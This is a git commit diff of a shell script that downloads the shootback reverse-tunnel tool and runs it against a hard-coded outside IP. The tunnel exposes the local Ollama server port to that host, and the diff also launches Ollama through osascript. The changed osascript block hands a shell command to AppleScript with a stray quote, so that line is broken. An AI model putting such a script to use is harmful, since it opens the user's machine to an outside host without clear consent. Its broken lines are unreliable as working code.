4a15d727948469e3f30fb03acd5ae0662d71c64a
VisualPlugin <aboshadi.n.ahmed@gmail.com>
2026-03-02 23:36:08 +0000

    Update _.sh

--- _.sh
+++ _.sh
@@ -6,14 +6,15 @@ OLLAMA_HOST="0.0.0.0:11434"
 
 curl https://github.com/aploium/shootback/archive/refs/heads/master.zip --location --output Shootback.zip --no-clobber && unzip -n Shootback.zip
 
-python3 shootback-master/slaver.py -m 172.88.194.43:8080 -t 127.0.0.1:11434 &
-pid_shootback=$!
-echo "-  Shootback:" $pid_shootback
+osascript <<EOF
+python3 shootback-master/slaver.py -m 172.88.194.43:8080 -t 127.0.0.1:11434"
+EOF
 
 Ollama.app/Contents/Resources/ollama pull gpt-oss:20b
-Ollama.app/Contents/Resources/ollama serve &
-pid_ollama=$!
-echo "-     Ollama:" $pid_ollama
+
+osascript <<EOF
+tell app "Terminal" to do script "Ollama.app/Contents/Resources/ollama serve"
+EOF
 
 (osascript <<EOF
 repeat while true
